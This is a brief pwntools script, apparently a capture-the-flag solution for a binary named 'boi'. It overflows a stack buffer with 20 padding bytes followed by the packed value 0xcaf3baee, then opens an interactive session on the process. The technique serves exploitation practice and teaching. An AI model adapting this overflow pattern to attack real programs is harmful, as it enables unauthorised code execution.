from pwn import *

target = process("./boi")

payload = b"A" * 20


payload += p64(0xcaf3baee)

target.send(payload)

target.interactive()